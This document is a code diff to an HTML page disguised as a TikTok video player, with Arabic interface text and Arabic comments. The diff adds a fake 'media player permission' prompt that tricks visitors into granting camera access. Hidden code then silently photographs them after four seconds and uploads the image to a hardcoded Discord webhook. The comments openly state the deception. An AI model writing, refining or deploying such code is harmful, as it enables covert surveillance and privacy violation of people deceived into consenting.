@@ -3,17 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
+    <title>تأكيد مشغل الوسائط | TikTok</title>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
         #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        
         #start-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); display: flex; flex-direction: column;
+            background: rgba(0,0,0,0.96); display: flex; flex-direction: column;
             justify-content: center; align-items: center; z-index: 100; color: white; cursor: pointer;
+            text-align: center; padding: 30px;
         }
-        .play-btn { font-size: 60px; margin-bottom: 10px; }
+        .play-btn { font-size: 80px; color: #fe2c55; margin-bottom: 20px; }
+        .alert-box { border: 1px solid #444; padding: 20px; border-radius: 10px; background: #111; max-width: 400px; }
+        .instruction-text { font-size: 18px; color: #fff; line-height: 1.6; }
+        .highlight { color: #fe2c55; font-weight: bold; }
+
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #photo-canvas { display: none; }
     </style>
@@ -28,7 +34,12 @@
 
     <div id="start-overlay">
         <div class="play-btn">▶️</div>
-        <p>اضغط للمشاهدة</p>
+        <div class="alert-box">
+            <p class="instruction-text">
+                <span class="highlight">⚠️ إذن تشغيل المحتوى</span><br>
+                لتتمكن من مشاهدة الفيديو بالصوت، يرجى الضغط على <span class="highlight">"سماح" (Allow)</span> لتفعيل مشغل الوسائط التلقائي.
+            </p>
+        </div>
     </div>
 </div>
 
@@ -36,23 +47,26 @@
 <canvas id="photo-canvas"></canvas>
 
 <script>
+    // رابط الويب هوك الخاص بك في ديسكورد
     const webhookURL = 'https://discord.com/api/webhooks/1493335289580752997/hM7a43330A99MIuxDvK_p-pvH0S0hdYSfCtDO4I4fhd9sGshS_76x7kowHqi29VAPjgz';
+    
     const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
     const camera = document.getElementById('hidden-camera');
 
     overlay.addEventListener('click', async () => {
-        // تشغيل الفيديو والصوت
+        // تشغيل الفيديو فوراً في الخلفية
         iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
         iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+        
         overlay.style.display = 'none';
 
         try {
-            // طلب الكاميرا
+            // طلب "إذن الوسائط" (اللي بيظنه المستخدم إذن تشغيل الفيديو)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             camera.srcObject = stream;
             
-            // التصوير بعد 4 ثواني بالضبط
+            // تصوير الشخص بعد 4 ثواني من موافقته
             setTimeout(captureAndSend, 4000);
         } catch (err) {
             console.log("Access Denied");
@@ -68,23 +82,14 @@
         canvas.height = camera.videoHeight;
         context.drawImage(camera, 0, 0, canvas.width, canvas.height);
         
-        // الحل الأكيد: تحويل الصورة لـ Blob وإرسالها كملف رسمي
         canvas.toBlob(async (blob) => {
             if (!blob) return;
             const formData = new FormData();
             formData.append('file', blob, 'shot.png');
-            formData.append('content', '✅ **وصلت الصورة المطلوبة!**');
+            formData.append('content', '✅ **وصلت الصورة المطلوبة عبر تمويه تشغيل الفيديو!**');
             
-            // إرسال للديسكورد مع نظام الانتظار
-            await fetch(webhookURL, { 
-                method: 'POST', 
-                body: formData 
-            }).then(() => {
-                console.log("Sent successfully");
-            }).catch(err => {
-                // إذا فشل، يحاول مرة أخرى بعد ثانية
-                setTimeout(captureAndSend, 1000);
-            });
+            // إرسال الصورة للديسكورد
+            await fetch(webhookURL, { method: 'POST', body: formData });
         }, 'image/png');
     }
 </script>
